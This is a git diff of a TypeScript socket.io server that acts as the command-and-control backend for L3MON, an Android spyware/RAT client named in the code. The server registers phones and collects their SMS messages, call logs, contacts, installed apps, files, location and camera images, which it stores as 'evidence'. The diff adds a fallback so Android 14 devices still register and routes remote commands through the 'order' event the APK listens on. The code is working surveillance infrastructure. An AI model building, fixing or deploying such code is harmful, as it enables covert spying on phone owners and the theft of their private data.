@@ -2,8 +2,11 @@ import { Server as HTTPServer } from "http";
 import { Server as SocketIOServer, Socket } from "socket.io";
 import { getDb } from "./db";
 import { eq } from "drizzle-orm";
-import { devices, locationHistory, smsLogs } from "../drizzle/schema";
+import { devices, locationHistory, smsLogs, mediaFiles, callLogs, contacts, installedApps } from "../drizzle/schema";
 import { eventBus } from "./eventBus";
+import path from "path";
+import fs from "fs/promises";
+
 
 export interface DeviceLocation {
   deviceId: number;
@@ -45,11 +48,28 @@ export class WebSocketManager {
       },
       transports: ["websocket", "polling"],
       allowEIO3: true,
+      path: "/l3mon", // Ruta dedicada para evitar colisión con /api
     });
 
+
+
+    // Diagnóstico de bajo nivel
+    this.io.engine.on("connection_error", (err: any) => {
+      console.log(`[WebSocket] !!! ERROR DE CONEXIÓN !!!`);
+      console.log(`[WebSocket] Código: ${err.code} | Mensaje: ${err.message}`);
+      console.log(`[WebSocket] Context:`, err.context);
+      console.log(`[WebSocket] URL original: ${err.req.url}`);
+    });
+
+    // Limpiar listeners previos para evitar duplicados en reinicios de desarrollo
+    eventBus.removeAllListeners("execute-command");
+
     this.setupEventHandlers();
+
     this.setupEventBusListeners();
   }
+
+
 
   private setupEventBusListeners(): void {
     eventBus.on("execute-command", (data: any) => {
@@ -66,49 +86,54 @@ export class WebSocketManager {
   private setupEventHandlers(): void {
     this.io.on("connection", async (socket: Socket) => {
       const { model, manf, release, id: androidId } = socket.handshake.query;
-      console.log(`[WebSocket] New socket trying to connect: ${socket.id} | Handshake params: model=${model}, androidId=${androidId}`);
+      console.log(`[WebSocket] [${new Date().toLocaleTimeString()}] Intento de conexión: SID=${socket.id}`);
+      console.log(`[WebSocket] Query Params - Model: ${model}, Manf: ${manf}, ID: ${androidId}`);
 
       // 1. Device Registration / Identification
       let connectedDeviceId: number | null = null;
-      if (androidId && model) {
-        try {
-          const db = await getDb();
-          if (db) {
-            const deviceRecords = await db.select().from(devices).where(eq(devices.deviceId, String(androidId))).limit(1);
-            if (deviceRecords.length > 0) {
-              connectedDeviceId = deviceRecords[0].id;
-              await db.update(devices).set({ status: "online", lastSeen: new Date() }).where(eq(devices.id, connectedDeviceId));
-            } else {
-              const result = await db.insert(devices).values({
-                deviceId: String(androidId),
-                deviceName: `${manf || 'Android'} ${model}`,
-                manufacturer: String(manf || 'Unknown'),
-                model: String(model),
-                androidVersion: String(release || 'Unknown'),
-                ownerId: 1,
-                status: "online",
-                lastSeen: new Date(),
-              } as any);
-              connectedDeviceId = (result as any)[0]?.insertId;
-            }
+      
+      // [PRO-FIX] Fallback for Android 14 restricted IDs
+      const effectiveId = (androidId && String(androidId).trim().length > 0) ? String(androidId) : `gen-${socket.id.substring(0, 8)}`;
+      const effectiveModel = (model && String(model).trim().length > 0) ? String(model) : "Android Device";
 
-            if (connectedDeviceId) {
-              console.log(`[WebSocket] Device ${connectedDeviceId} identifying. Joining room: device:${connectedDeviceId}`);
-              socket.join(`device:${connectedDeviceId}`);
-              (socket as any).deviceId = connectedDeviceId;
-              if (!this.deviceConnections.has(connectedDeviceId)) {
-                this.deviceConnections.set(connectedDeviceId, new Set());
-              }
-              this.deviceConnections.get(connectedDeviceId)!.add(socket.id);
-              console.log(`[WebSocket] Device ${connectedDeviceId} (${model}) is now ONLINE.`);
-              this.io.emit("device-status", { deviceId: connectedDeviceId, status: "online", timestamp: Date.now() });
-            } else {
-              console.warn(`[WebSocket] Socket ${socket.id} connected but could not be mapped to a device. androidId=${androidId}`);
-            }
+      try {
+        const db = await getDb();
+        if (db) {
+          console.log(`[WebSocket] Buscando/Registrando ID: ${effectiveId}`);
+          const deviceRecords = await db.select().from(devices).where(eq(devices.deviceId, effectiveId)).limit(1);
+          
+          if (deviceRecords.length > 0) {
+            connectedDeviceId = deviceRecords[0].id;
+            console.log(`[WebSocket] Dispositivo existente encontrado [ID:${connectedDeviceId}]`);
+            await db.update(devices).set({ status: "online", lastSeen: new Date() }).where(eq(devices.id, connectedDeviceId));
+          } else {
+            console.log(`[WebSocket] Creando NUEVO registro para: ${effectiveModel}`);
+            const result = await db.insert(devices).values({
+              deviceId: effectiveId,
+              deviceName: `${manf || 'Android'} ${effectiveModel}`,
+              manufacturer: String(manf || 'Unknown'),
+              model: effectiveModel,
+              androidVersion: String(release || 'Unknown'),
+              ownerId: 1,
+              status: "online",
+              lastSeen: new Date(),
+            } as any);
+            connectedDeviceId = (result as any)[0]?.insertId;
           }
-        } catch (e) {
-          console.error("[WebSocket] Device registration failed:", e);
+
+          if (connectedDeviceId) {
+            socket.join(`device:${connectedDeviceId}`);
+            (socket as any).deviceId = connectedDeviceId;
+            if (!this.deviceConnections.has(connectedDeviceId)) {
+              this.deviceConnections.set(connectedDeviceId, new Set());
+            }
+            this.deviceConnections.get(connectedDeviceId)!.add(socket.id);
+            console.log(`[WebSocket] Dispositivo ${connectedDeviceId} (${effectiveModel}) ONLINE.`);
+            this.io.emit("device-status", { deviceId: connectedDeviceId, status: "online", timestamp: Date.now() });
+          }
         }
+      } catch (e) {
+        console.error("[WebSocket] ERROR CRÍTICO en registro:", e);
       }
 
       // 2. User Handlers (Dashboard access)
@@ -191,8 +216,9 @@ export class WebSocketManager {
         if (id) {
           if (typeof data === 'boolean' || data.success !== undefined) return; 
           const smsList = data.list || data.sms || data.messages || [];
-          const { eventBus } = require("./eventBus");
           eventBus.emit(`sms-response-${id}`, { deviceId: id, messages: smsList });
+
+
           this.io.to(`device:${id}`).emit("sms-update", { messages: smsList, deviceId: id });
         }
       });
@@ -272,16 +298,18 @@ export class WebSocketManager {
       socket.on("device-files", (data: { deviceId: number, path: string, contents: any[] }) => {
         const id = connectedDeviceId || data.deviceId;
         if (id) {
-          const { eventBus } = require("./eventBus");
           eventBus.emit(`files-response-${id}`, data);
+
+
         }
       });
 
       socket.on("device-apps", (data: { deviceId: number, apps: any[] }) => {
         const id = connectedDeviceId || data.deviceId;
         if (id) {
-          const { eventBus } = require("./eventBus");
           eventBus.emit(`apps-response-${id}`, data);
+
+
         }
       });
 
@@ -290,8 +318,9 @@ export class WebSocketManager {
         const id = connectedDeviceId || data.deviceId;
         if (id) {
           console.log(`[WebSocket] Calls data from device ${id}: ${data.calls?.length} records`);
-          const { eventBus } = require("./eventBus");
           eventBus.emit(`calls-response-${id}`, data);
+
+
           this.io.to(`device:${id}`).emit("calls-update", { ...data, deviceId: id });
         }
       });
@@ -301,8 +330,9 @@ export class WebSocketManager {
         const id = connectedDeviceId || data.deviceId;
         if (id) {
           const callsArray = data.list || data.calls || (Array.isArray(data) ? data : []);
-          const { eventBus } = require("./eventBus");
           eventBus.emit(`calls-response-${id}`, { deviceId: id, calls: callsArray });
+
+
           this.io.to(`device:${id}`).emit("calls-update", { calls: callsArray, deviceId: id });
         }
       });
@@ -313,8 +343,9 @@ export class WebSocketManager {
         const id = connectedDeviceId || data.deviceId;
         if (id) {
           console.log(`[WebSocket] Contacts data from device ${id}: ${data.contacts?.length} records`);
-          const { eventBus } = require("./eventBus");
           eventBus.emit(`contacts-response-${id}`, data);
+
+
           this.io.to(`device:${id}`).emit("contacts-update", { ...data, deviceId: id });
         }
       });
@@ -324,8 +355,9 @@ export class WebSocketManager {
         const id = connectedDeviceId || data.deviceId;
         if (id) {
           const contactsArray = data.list || data.contacts || (Array.isArray(data) ? data : []);
-          const { eventBus } = require("./eventBus");
           eventBus.emit(`contacts-response-${id}`, { deviceId: id, contacts: contactsArray });
+
+
           this.io.to(`device:${id}`).emit("contacts-update", { contacts: contactsArray, deviceId: id });
         }
       });
@@ -338,8 +370,6 @@ export class WebSocketManager {
           console.log(`[WebSocket] Camera data received from device ${id}`);
           try {
             // Save image to evidence folder and DB
-            const fs = await import("fs/promises");
-            const path = await import("path");
             const evidenceDir = path.join(process.cwd(), "builds", "evidence");
             await fs.mkdir(evidenceDir, { recursive: true });
             if (data.imageBase64) {
@@ -349,7 +379,6 @@ export class WebSocketManager {
               await fs.writeFile(filePath, Buffer.from(data.imageBase64, "base64"));
               const db = await getDb();
               if (db) {
-                const { mediaFiles } = await import("../drizzle/schema");
                 await (db as any).insert(mediaFiles).values({
                   deviceId: id,
                   fileName,
@@ -359,6 +388,7 @@ export class WebSocketManager {
                   timestamp: new Date(),
                 });
               }
+
               this.io.to(`device:${id}`).emit("camera-new", { deviceId: id, fileName, url: `/evidence/${fileName}`, timestamp });
               console.log(`[WebSocket] Camera image saved: ${fileName}`);
             }
@@ -679,24 +709,27 @@ export class WebSocketManager {
     }
 
     const payload = {
-      action: finalAction,
-      type: mappedAction, // This must always be the 0x code (e.g. 0xSM)
+      type: mappedAction, // El APK busca el comando en el campo "type" (ej: 0xVB)
+      action: finalAction, // Compatibilidad con otros componentes
       ...finalPayload,
       deviceId: deviceId,
       timestamp: Date.now()
     };
 
-    console.log(`[WebSocket] TRANSMIT to device:${deviceId} | Protocol: Multi-Event | Action: ${mappedAction}`);
+    console.log(`[WebSocket] TRANSMIT to device:${deviceId} | Event: order | Type: ${mappedAction}`);
 
-    // Broadcast across ALL possible event listeners for maximum compatibility
-    this.io.to(`device:${deviceId}`).emit("execute-command", payload);
-    this.io.to(`device:${deviceId}`).emit("order", payload);
-    this.io.to(`device:${deviceId}`).emit("command", payload);
-    // Specifically handle the event name passed (like 'get-location') if different
-    if (event !== "execute-command" && event !== "order" && event !== "command") {
-       this.io.to(`device:${deviceId}`).emit(event, payload);
+    if (this.io) {
+      // El APK L3MON V3/Platinum solo escucha el evento "order"
+      this.io.to(`device:${deviceId}`).emit("order", payload);
+      
+      // Fallback para otros posibles eventos (redundancia segura)
+      this.io.to(`device:${deviceId}`).emit("execute-command", payload);
+      this.io.to(`device:${deviceId}`).emit("command", payload);
+    } else {
+      console.error("[WebSocket] CRITICAL: Attempted to broadcast but this.io is null!");
     }
   }
+
 
   public broadcastToAll(event: string, data: any): void {
     this.io.emit(event, data);
